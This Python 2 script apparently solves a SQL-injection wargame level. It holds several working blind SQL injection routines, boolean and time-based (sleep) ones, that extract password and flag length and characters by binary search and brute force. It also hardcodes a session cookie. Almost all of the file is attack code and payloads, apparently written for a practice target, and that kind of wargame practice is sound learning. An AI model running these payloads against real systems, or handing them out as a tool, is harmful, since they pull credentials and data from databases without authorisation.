# -*- coding: utf8 -*-
import urllib
import urllib2
import requests
import time
#string = "0123456789ABCDEF"
string = "1234567890abcdefghijklmnopqrstuvwxyz"
pw=''
ul = 'http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag='
def getlength():    
    s=0
    t=50
    while (s<t):
        if (t-s==1):
            if doinject('\'||ascii(id)=97%26%26length(pw)='+str(t)+'%23'):
                m=t
                break
            else:
                m=s
                break
        m=(s+t)/2
        if doinject('\'||ascii(id)=97%26%26length(pw)>'+str(m)+'%23'):
            s=m+1
        else:
            t=m
    print '[*]length is %s' % m
    return m
def getlength2():
	s=0
	t=200
	while (s<t):
		if (t-s==1):
			if doinject('\'||ascii(id)=97%26%26length(hex(pw))='+str(t)+'%23'):
				m=t
				break
			else:
				m=s
				break
		m=(s+t)/2
		if doinject('\'||ascii(id)=97%26%26length(hex(pw))>'+str(m)+'%23'):
			s=m+1
		else:
			t=m
	print '[*]length is %s' % m
	return m
def getlength3():
	for j in range(1,100):
		data = "' || ( id='admin' && if(length(hex(pw))={},true,(select 1 union select 2)));".format(j)
		data = requests.utils.quote(data)+"%00"
		if doinject(str(data)):
			loop = j
			break
 
	print '[*]the length is %s' % loop
	return loop
def getlength4():
	for j in range(1,100):
		data = "(select sleep(case when length(flag) like {} then '20' else '0' END)^(select '1' union select '2'))".format(j)
		data = requests.utils.quote(data)+"%00"
		if doinject(str(data)):
			loop = j
			break
 
	print '[*]the length is %s' % loop
	return loop 
def getlength5():
	for j in range(1,200):
		data = "(select sleep(case when length(flag) like {} then 4 else 0 END)^(select '1' union select '2'))".format(j)
		data = requests.utils.quote(data)
		if doinject(str(data)):
			loop = j
			break
	print '[*]the length is %s' % j
	return j 

def doinject(payload):
    #print payload
    url=ul+payload
    start_time=time.time()
    print url
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    info = { 'User-Agent' : user_agent,
                'cookie':'__cfduid=dad2e2829958f82d5741ad845023671931508994468; PHPSESSID=0638s8clmmc1vqf8dfj1b8rj60'
              }
    req = urllib2.Request(str(url),headers=info)
    response = urllib2.urlopen(req)
    #the_page = response.read()
    times = time.time() - start_time
    print  times
    if times > 3:
    #if (the_page.find("Clear")>0):
        #loop = j
        #break
    #response = urllib2.urlopen(req)
    #the_page = response.read()
    #print the_page
    #if len(the_page)>0:
        return True
    else:
        return False
def getdump(a):
		res = ""
		for i in range(1,a):
			s=0
			t=130
			while (s<t):
				if (t-s==1):
					if doinject('%27||ascii(id)=97%26%26substr(pw,'+str(i)+',1)=char('+str(t)+')%23'):#important 
						m=t
						break
					else:
						m=s
						break
				m=(s+t)/2
				if doinject('%27||ascii(id)=97%26%26substr(pw,'+str(i)+',1)>char('+str(m)+')%23'):
					s=m+1
				else:
					t=m
			res = res+chr(m)
			print '[*]%s'% res
		print '[*] ok ! get it!'
def getdump2(a):
	res=""
	for i in range(1,a+1):
		for j in string:
			data = "1' || id='admin' && right(left(hex(pw),{}),1) = 0x{} ;".format(i,str(j).encode('hex'))
			data = requests.utils.quote(data)+"%00"
			if doinject(str(data)):
				pw = pw + str(j)
				print "[!]found %s" % pw
				break
	print "[*]The pass is %s" % pw
	print '[*] ok ! get it!'
def getdump3(a):
	pw=''
	for i in range(1,a):
		for j in string:
			data = "1' || ( id='admin' && if(right(left(hex(pw),{}),1) = 0x{},true,(select 1 union select 2))) ;".format(i,str(j).encode('hex'))
			data = requests.utils.quote(data)+"%00"
			if doinject(str(data)):
				pw = pw + str(j)
				print "[!] found",pw
				break
	print "[*]The pass is %s" % pw
	print '[*] ok ! get it!'
def getdump4(a):
	pw=''
	for i in range(1,a):
		for j in string:
			data = "1' || ( id='admin' && (select right(left(hex(pw),{}),1) = 0x{} union select 1 )) ;".format(i,str(j).encode('hex'))
			data = requests.utils.quote(data)+"%00"
			if doinject(str(data)):
				pw = pw + str(j)
				print "[!] found",pw
				break
	print "[*]The pass is %s" % pw
	print '[*] ok ! get it!'
def getdump5(a):
	pw=''
	for i in range(1,a):
		for j in string:
			data = "(select sleep(case when flag like '{}{}%' then 3 else 0 END)^(select 1 union select 2))".format(pw,j)
			data = requests.utils.quote(data)
			if doinject(str(data)):
				pw = pw + str(j)
				print "[!] found",pw
				break
				break
	print "[*]The pass is %s" % pw
	print '[*] ok ! get it!'
def fuzhu():
	for s in ['A','a']:
		for d in ['A','a']:
			for f in ['A','a']:
				for g in ['C','c']:
					for h in ['E','e']:
						for i in ['C','c']:
							a=s+'6454'+d+'1'+f+'19'+g+h+'8'+i+'79'
							if doinject(str(a)):
								print a
								break
if __name__=='__main__':
		#a=getlength5()+1
		a=17
		getdump5(a)
		#fuzhu()